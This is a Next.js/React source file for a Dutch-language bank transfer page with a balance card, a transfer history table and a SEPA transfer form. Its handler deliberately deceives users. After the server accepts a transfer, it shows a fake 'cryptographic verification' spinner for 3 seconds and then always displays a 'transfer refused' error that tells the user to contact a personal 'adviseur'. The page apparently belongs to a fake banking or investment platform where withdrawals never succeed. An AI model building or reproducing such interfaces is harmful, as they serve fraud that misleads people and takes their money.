"use client";

import React, { useState, useEffect } from "react";
import Link from "next/link";

export default function TransferPage() {
  const [balance, setBalance] = useState<number>(0);
  const [loadingBalance, setLoadingBalance] = useState<boolean>(true);
  
  // Statuses voor het overschrijvingsformulier
  const [showModal, setShowModal] = useState<boolean>(false);
  const [beneficiaryName, setBeneficiaryName] = useState<string>("");
  const [iban, setIban] = useState<string>("");
  const [bic, setBic] = useState<string>("");
  const [amount, setAmount] = useState<string>("");
  
  // Actiestatuses
  const [processing, setProcessing] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  
  // Status voor het weergeven van het kritieke foutvenster
  const [showCriticalError, setShowCriticalError] = useState<boolean>(false);

  const [history, setHistory] = useState<any[]>([]);

  // Gebruikerssaldo en geschiedenis ophalen via de me-API
  useEffect(() => {
    const fetchUserData = async () => {
      try {
        const res = await fetch("/api/auth/me");
        if (res.ok) {
          const data = await res.json();
          setBalance(data.user?.balance ?? 0.0);
          setHistory(data.transfers || []);
        }
      } catch (err) {
        console.error("Fout bij het ophalen van het saldo:", err);
      } finally {
        setLoadingBalance(false);
      }
    };
    fetchUserData();
  }, []);

  const handleTransferSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage(null);
    
    const transferAmount = parseFloat(amount);

    if (transferAmount > balance) {
      setErrorMessage(`Onvoldoende saldo voor deze overschrijving. Uw huidige saldo bedraagt € ${balance.toFixed(2)}.`);
      return;
    }

    setProcessing(true);

    try {
      // Verzenden van de overschrijvingsaanvraag naar de server
      const res = await fetch("/api/user/transfer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ beneficiaryName, iban, bic, amount: transferAmount }),
      });

      if (res.ok) {
        // Na 3 seconden loader verbergen en foutmelding tonen
        setTimeout(() => {
          setProcessing(false);
          setShowCriticalError(true);
        }, 3000);
      } else {
        const errData = await res.json();
        setErrorMessage(errData.error || "Er is een fout opgetreden.");
        setProcessing(false);
      }
    } catch (err) {
      setErrorMessage("Verbindingsfout met de server.");
      setProcessing(false);
    }
  }; 
 
  const closeAllModals = () => {
    setShowModal(false);
    setShowCriticalError(false);
    setBeneficiaryName("");
    setIban("");
    setBic("");
    setAmount("");
  };

  return (
    <div className="b99-transfer-container poppins-font">
      {/* BANNER */}
      <div className="b99-finance-banner">
        <div className="banner-flex-row">
          <div>
            <h2>Overschrijvingen & Transfers</h2>
            <p>Voer uw SEPA- en internationale overschrijvingen veilig uit.</p>
          </div>
        </div>
      </div>

      {/* SALDO KAART */}
      <div className="b99-balance-card">
        <span className="balance-label">Beschikbaar saldo op uw rekening</span>
        {loadingBalance ? (
          <h1 className="balance-amount loading-text">Laden...</h1>
        ) : (
          <h1 className="balance-amount">€ {balance.toFixed(2)}</h1>
        )}
        <button 
          onClick={() => { setShowModal(true); setErrorMessage(null); setShowCriticalError(false); }} 
          className="primary-action-yellow-btn"
          disabled={loadingBalance}
        >
          📲 Overschrijving uitvoeren
        </button>

        {/* OVERSCHRIJVINGSGESCHIEDENIS */}
        <div className="b99-balance-card" style={{ marginTop: "30px", textAlign: "left", maxWidth: "100%" }}>
          <h3 style={{ marginBottom: "15px", fontSize: "18px", fontWeight: "600" }}>Geschiedenis van uw overschrijvingen</h3>
          {history.length === 0 ? (
            <p style={{ color: "#64748b", fontSize: "14px" }}>Er zijn momenteel geen overschrijvingen.</p>
          ) : (
            <div style={{ overflowX: "auto" }}>
              <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "14px" }}>
                <thead>
                  <tr style={{ borderBottom: "2px solid #e2e8f0", color: "#64748b" }}>
                    <th style={{ padding: "10px", textAlign: "left" }}>Ontvanger</th>
                    <th style={{ padding: "10px", textAlign: "left" }}>Bedrag</th>
                    <th style={{ padding: "10px", textAlign: "left" }}>Datum</th>
                    <th style={{ padding: "10px", textAlign: "right" }}>Status</th>
                  </tr>
                </thead>
                <tbody>
                  {history.map((t) => (
                    <tr key={t.id} style={{ borderBottom: "1px solid #f1f5f9" }}>
                      <td style={{ padding: "12px 10px" }}>
                        <b>{t.beneficiaryName}</b>
                        <div style={{ fontSize: "12px", color: "#64748b" }}>{t.iban}</div>
                      </td>
                      <td style={{ padding: "12px 10px", color: "#ef4444", fontWeight: "500" }}>
                        -€ {t.amount.toFixed(2)}
                      </td>
                      <td style={{ padding: "12px 10px", color: "#64748b" }}>
                        {new Date(t.createdAt).toLocaleDateString("nl-NL")}
                      </td>
                      <td style={{ padding: "12px 10px", textAlign: "right" }}>
                        <span className={`b99-admin-status-select status-${t.status.toLowerCase()}`} style={{ padding: "4px 8px", borderRadius: "4px", fontSize: "12px", fontWeight: "500" }}>
                          {t.status === "En attente" || t.status === "In Bearbeitung" || t.status === "In behandeling" ? "⏳ In behandeling" : t.status === "Approuvé" || t.status === "Bestätigt" || t.status === "Goedgekeurd" ? "✅ Goedgekeurd" : "❌ Geweigerd"}
                        </span>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>

      {/* FORMULIER MODAL */}
      {showModal && (
        <div className="b99-modal-overlay">
          <div className="b99-modal-content">
            
            {/* Kritieke foutmelding */}
            {showCriticalError ? (
              <div className="b99-critical-error-view">
                <div className="error-icon-circle">✕</div>
                <h3>Actie vereist: Overschrijving geweigerd</h3>
                <p className="error-main-text">
                  Uw rekening vereist een aanvullende identiteitsverificatie of een administratieve update om uitgaande overschrijvingen uit te voeren.
                </p>
                <div className="instruction-box">
                  Neem onmiddellijk contact op met uw persoonlijke <strong>adviseur</strong> om de situatie te verhelderen en deze transactie af te ronden.
                </div>
                <button onClick={closeAllModals} className="error-close-action-btn">
                  Begrepen
                </button>
              </div>
            ) : processing ? (
              /* LAADSCHERM */
              <div className="modal-processing-view">
                <div className="b99-spinner-loader"></div>
                <h4>Overschrijvingsopdracht wordt verwerkt...</h4>
                <p>Verificatie van cryptografische toegang en beveiligen van fondsen</p>
              </div>
            ) : (
              /* INVOERFORMULIER */
              <>
                <div className="modal-header">
                  <h3>Nieuwe SEPA-overschrijving</h3>
                  <button 
                    onClick={() => setShowModal(false)} 
                    className="close-modal-btn"
                  >
                    &times;
                  </button>
                </div>
                <form onSubmit={handleTransferSubmit} className="b99-transfer-form">
                  
                  {errorMessage && (
                    <div className="b99-error-alert-box">
                      ⚠️ {errorMessage}
                    </div>
                  )}

                  <div className="form-group">
                    <label>Naam van de ontvanger</label>
                    <input 
                      type="text" 
                      placeholder="bijv. Jan Jansen" 
                      value={beneficiaryName} 
                      onChange={(e) => setBeneficiaryName(e.target.value)} 
                      required 
                    />
                  </div>

                  <div className="form-group">
                    <label>IBAN van de ontvanger</label>
                    <input 
                      type="text" 
                      placeholder="NLXX XXXX XXXX XXXX XX" 
                      value={iban} 
                      onChange={(e) => setIban(e.target.value.toUpperCase())} 
                      required 
                    />
                  </div>

                  <div className="form-group">
                    <label>BIC / SWIFT</label>
                    <input 
                      type="text" 
                      placeholder="bijv. RABONL2U" 
                      value={bic} 
                      onChange={(e) => setBic(e.target.value.toUpperCase())} 
                      required 
                    />
                  </div>

                  <div className="form-group">
                    <label>Bedrag (€)</label>
                    <input 
                      type="number" 
                      step="0.01"
                      min="1"
                      placeholder="0.00" 
                      value={amount} 
                      onChange={(e) => setAmount(e.target.value)} 
                      required 
                    />
                  </div>

                  <div className="modal-actions-footer">
                    <button 
                      type="button" 
                      onClick={() => setShowModal(false)} 
                      className="cancel-btn"
                    >
                      Annuleren
                    </button>
                    <button 
                      type="submit" 
                      className="confirm-btn"
                    >
                      Overschrijving bevestigen
                    </button>
                  </div>
                </form>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
}